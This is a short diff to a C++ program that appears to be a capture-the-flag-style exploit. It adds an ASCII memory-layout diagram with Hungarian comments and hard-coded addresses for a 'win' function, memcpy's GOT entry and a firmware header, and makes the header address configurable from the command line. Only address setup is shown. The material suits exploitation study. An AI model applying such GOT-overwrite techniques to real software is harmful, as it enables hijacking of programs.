@@ -62,6 +62,7 @@ int main(int argc, char* argv[]) {
                           0x00000041e220: xxxxxxxxxxxxxxxxxx                                            |    |
                           0x00000041e228: xxxxxxxxxxxxxxxxxx                                            |    |
                           0x00000041e230: 0x000000000041e280  --+                                       |    |
+                          0x00000041e238: 0x000000000041e288    |                                       |    |
                                           .......               |                                       |    |
                                                                 |                                       |    |
         addr_vector:      0x00000041e280: 0x000000000041e2c0  <-+   ---+  ez a vektor elso eleme        |    |                          
@@ -87,12 +88,18 @@ int main(int argc, char* argv[]) {
 
 
     */
+    auto addr_memcpy_got_plt    = 0x0000000000409070;
     auto addr_win               = 0x0000000000401e18;
     auto addr_pFwHeader         = 0x0000000000409178;
     auto addr_fwHeader          = 0x000000000041e208;
-    auto addr_memcpy_got_plt    = 0x0000000000409070;
 
-    auto addr_vector            = 0x000000000041e7f0;
+    if (argc > 1){
+        addr_fwHeader = strtol(argv[1], NULL, 16);
+    }
+    std::cout << std::hex << addr_fwHeader;
+    std::cout << "\n";
+
+    auto addr_vector            = addr_fwHeader + 0x5e0;
     auto addr_first_vector_item = addr_vector + 0x10;
    
 
